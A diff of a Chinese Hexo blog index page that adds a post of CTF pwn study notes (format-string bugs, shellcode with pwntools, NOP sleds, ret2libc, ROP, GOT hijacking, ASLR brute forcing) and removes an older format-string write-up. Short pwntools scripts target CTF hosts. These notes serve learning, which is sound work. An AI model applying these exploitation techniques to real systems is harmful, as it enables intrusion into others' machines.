@@ -116,7 +116,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">167</span>
+          <span class="site-state-item-count">168</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -152,6 +152,109 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/08/%E6%88%91%E5%92%8C%E6%88%91%E7%9A%84Lv-1%E7%9B%96%E4%BA%9A%E5%A5%A5%E7%89%B9%E6%9B%BC%E5%8F%AC%E5%94%A4%E5%99%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="水之黑犀铠甲第二代召唤人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="要roll就来！要roll就来！">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/04/08/%E6%88%91%E5%92%8C%E6%88%91%E7%9A%84Lv-1%E7%9B%96%E4%BA%9A%E5%A5%A5%E7%89%B9%E6%9B%BC%E5%8F%AC%E5%94%A4%E5%99%A8/" class="post-title-link" itemprop="url">我和我的Lv.1盖亚奥特曼召唤器</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-04-08 22:09:04" itemprop="dateCreated datePublished" datetime="2021-04-08T22:09:04+08:00">2021-04-08</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-09-05 10:18:16" itemprop="dateModified" datetime="2021-09-05T10:18:16+08:00">2021-09-05</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="泄露数据">泄露数据</h1>
+<h3 id="printf函数格式化字符串漏洞">printf函数格式化字符串漏洞</h3>
+<h1 id="修改数据">修改数据</h1>
+<h3 id="数据偏移">数据偏移</h3>
+<p>给定读入数据范围过大，以至于可覆盖掉其它数据 strcpy函数的粘贴过程也可以理解为读入</p>
+<h3 id="printf函数格式化字符串漏洞-1">printf函数格式化字符串漏洞</h3>
+<p>向栈内某处出写入数据</p>
+<h3 id="整型变量溢出">整型变量溢出</h3>
+<h1 id="伪随机">伪随机</h1>
+<p>伪随机函数，只要给出同一个种子，在同一个环境下（windows或Linux），会产生相同的结果</p>
+<h1 id="栈溢出">栈溢出</h1>
+<h3 id="shellcode">shellcode</h3>
+<p>修改返回地址，让其指向溢出数据中的一段指令（shellcode）</p>
+<p>shellcode 可以用汇编语言来写再转成对应的机器码，也可以上网搜索直接复制粘贴，这里简单介绍，具体在pwn工具的博客里 （以下为获取pwntools内置集成） （1）先设置目标机的参数 context(os=’linux’, arch=’amd64’, log_level=’debug’) os设置系统为linux系统，arch设置架构为amd64，32位下是i386 log_level用于debug （2）获取shellcode 获得执行system(“/bin/sh”)汇编代码所对应的机器码 asm(shellcraft.sh()) 例子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
+<p>获取shellcode的起始地址：</p>
+<p>覆盖完ebp后，填充若干长度的 “”，在写入shellcode。""这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处，所以这种方法被称为 NOP Sled（中文含义是“滑雪橇”）。</p>
+<p>ps：当函数调用的栈中的数据没有可执行权限，此攻击手法彻底无效</p>
+<h3 id="return2libc">return2libc</h3>
+<p>修改返回地址，让其指向内存中已有的某个函数（return2libc）</p>
+<p>动态库包含了一些系统级的函数（例如 system() 等），鉴于要执行的函数可能需要参数，比如调用 system() 函数打开 shell 的完整形式为 system(“/bin/sh”) ，所以溢出数据也要包括必要的参数。</p>
+<p>下面介绍执行 system(“/bin/sh”)</p>
+<p>payload: padding1 + address of system() + padding2 + address of “/bin/sh”</p>
+<p>“/bin/sh” 的地址在哪里？</p>
+<p>可以在动态库里搜索这个字符串，如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过 getenv() 等函数来确定地址。</p>
+<h3 id="rop">ROP</h3>
+<p>修改返回地址，让其指向内存中已有的一段指令（ROP）</p>
+<h3 id="hijack-got">hijack GOT</h3>
+<p>修改某个被调用函数的地址，让其指向另一个函数（hijack GOT）</p>
+<h1 id="爆破">爆破</h1>
+<p>一旦程序开启了ASLR，除了低3位的地址以外其余全是扯淡，低位地址靠查，高位地址试出来</p>
+<p>一个例子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	io = remote(<span class="string">&quot;node2.hackingfor.fun&quot;</span>,<span class="number">36058</span>)</span><br><span class="line">	io.send(<span class="string">&quot;a&quot;</span>*<span class="number">16</span>+p16(<span class="number">0x64e1</span>))</span><br><span class="line">	res = io.recvall()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> res: <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1320,163 +1423,6 @@ p16()----2个字节</p>
 <p>只要通过溢出覆盖check-passwd函数的返回地址，返回到what is this函数去执行里面的代码，就可以得到我们需要的flag</p>
 <p>第一步 4h+4h=20D+4D=24 覆盖掉用于拷贝的栈24个字节 第二步 跳转到what is this的地址 p32（0x0804868B） p32大小为4个字节，至此已输入了28个字节 第三步 补充字节直到密码长度为259到264之间</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">47792</span>)</span><br><span class="line">flag = <span class="number">0x0804868B</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your username:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;your father&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your passwd:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">24</span> + p32(flag) + <span class="string">&quot;a&quot;</span>*<span class="number">232</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p>完结撒花</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/31/AD-CGfsb/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="水之黑犀铠甲第二代召唤人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="要roll就来！要roll就来！">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2020/12/31/AD-CGfsb/" class="post-title-link" itemprop="url">AD_CGfsb</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2020-12-31 16:04:37" itemprop="dateCreated datePublished" datetime="2020-12-31T16:04:37+08:00">2020-12-31</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-02-05 19:07:57" itemprop="dateModified" datetime="2021-02-05T19:07:57+08:00">2021-02-05</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <img src="/2020/12/31/AD-CGfsb/1.png" class>
-<p>得到信息： 32位程序 Partial RELRO容易受到攻击，例如攻击者可以atoi.got为system.plt进而输入/bin/sh00获得shell 开启了栈溢出保护 PIE未开启，在编译时将程序编译为位置相关，程序运行时各个段（如代码但等）加载的虚拟地址确定</p>
-<p><strong>printf与%n</strong></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> b=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;01234568789%n&quot;</span>,b); <span class="comment">//%n将之前输出的字符个数存入b，同时不输出字符串</span></span><br></pre></td></tr></table></figure>
-<p>%n前面写了10个字符，所以向ESP（栈顶指针）所指向的地址处所指向的地址处（ESP指向了栈顶，此处存储着一个地址）写入10。 %10$n，与%n类似，不过是向[ESP + 10]处指向的内存处写入7。</p>
-<p><strong>关于fgets</strong></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> a;</span><br><span class="line"><span class="built_in">fgets</span>(a,<span class="number">10</span>,stdin);<span class="comment">//从键盘输入中获取数据，当读取 (10-1) 个字符时，或者读取到换行符时停止</span></span><br><span class="line"><span class="comment">//如果成功，该函数返回相同的 a 参数。</span></span><br><span class="line"><span class="comment">//如果到达文件末尾或者没有读取到任何字符，a 的内容保持不变，并返回一个空指针。如果发生错误，返回一个空指针。</span></span><br><span class="line">fp = <span class="built_in">fopen</span>(<span class="string">&quot;file.txt&quot;</span> , <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp == <span class="literal">NULL</span>) &#123;<span class="built_in">perror</span>(<span class="string">&quot;打开文件时发生错误&quot;</span>);<span class="keyword">return</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">	<span class="keyword">if</span>( <span class="built_in">fgets</span> (str, <span class="number">60</span>, fp)!=<span class="literal">NULL</span> ) &#123;...&#125;<span class="comment">//从文件中获取数据</span></span><br><span class="line"><span class="built_in">fclose</span>(fp);</span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="built_in">fgets</span>(&amp;c,<span class="number">100</span>,stdin);<span class="comment">//改写c的地址</span></span><br></pre></td></tr></table></figure>
-<p><strong>堆栈中的printf函数</strong></p>
-<p>printf("format",输出表列) format意思是格式化字符串</p>
-<p>printf函数右序进栈</p>
-<p>printf 函数有一个 bug 就是当 format 字符串中所需要替换的参数数量，多于提供的参数数量，就会产生任意地址读漏洞。 例如，printf(“abcde%X %p %x %x”, a, b, c)这句命令中，format 需要 4 个参数，我们只提供了 3 个，所以 printf就会在栈上延续读取数据作为其参数。 如下所示，位于栈上的数据“我是你爹”由于挨着参数 3，在 printf 函数需要的参数不够时，被认作为 printf所缺的参数读取了</p>
-<table>
-<thead>
-<tr class="header">
-<th style="text-align: center;">地址</th>
-<th style="text-align: center;">栈</th>
-<th style="text-align: center;">内容</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td style="text-align: center;">高地址</td>
-<td style="text-align: center;">返回地址</td>
-<td style="text-align: center;">不晓得</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;"></td>
-<td style="text-align: center;">EBP</td>
-<td style="text-align: center;">某个指针，不晓得</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;"></td>
-<td style="text-align: center;">main函数局部变量</td>
-<td style="text-align: center;">保存用</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">0x12</td>
-<td style="text-align: center;">format字符串</td>
-<td style="text-align: center;">abcde%X %p %x %x</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;"></td>
-<td style="text-align: center;">main函数局部变量</td>
-<td style="text-align: center;">不晓得为什么有两个</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;"></td>
-<td style="text-align: center;">printf参数：我是你爹</td>
-<td style="text-align: center;">%x形式读取，可能是来自main的某个局部变量</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;"></td>
-<td style="text-align: center;">printf参数：参数3</td>
-<td style="text-align: center;">%x形式读取</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;"></td>
-<td style="text-align: center;">printf参数：参数2</td>
-<td style="text-align: center;">%p形式读取</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;"></td>
-<td style="text-align: center;">printf参数：参数1</td>
-<td style="text-align: center;">%X形式读取</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;"></td>
-<td style="text-align: center;">printf参数：format地址</td>
-<td style="text-align: center;">0x12</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;"></td>
-<td style="text-align: center;">返回地址</td>
-<td style="text-align: center;">不晓得为什么有两个</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">低地址</td>
-<td style="text-align: center;">printf母函数EBP</td>
-<td style="text-align: center;">不晓得</td>
-</tr>
-</tbody>
-</table>
-<img src="/2020/12/31/AD-CGfsb/2.png" class>
-<p>由上图计算出<strong>format字符串</strong>距离<strong>format地址</strong>的偏移量是10。 在32位运行时堆栈中，ESP 寄存器存放的是堆栈中某个位置的 32 位偏移量，相当于每4个字节1偏移量。</p>
-<img src="/2020/12/31/AD-CGfsb/3.png" class>
-<p>DB定义字节类型变量，一个字节数据占1个字节单元，读完一个，偏移量加1 DW定义字类型变量，一个字数据占2个字节单元，读完一个，偏移量加2 DD定义双字类型变量，一个双字数据占4个字节单元，读完一个，偏移量加4 pwnme的地址为0x0804A068，是一个字节的double word。p32函数将pwnme地址转化成了四个字节的小端序字符。c语言中，char类型，一个字符占一个字节，故一般意义上的字符数相当于字节数。</p>
 <p>完结撒花</p>
 
       
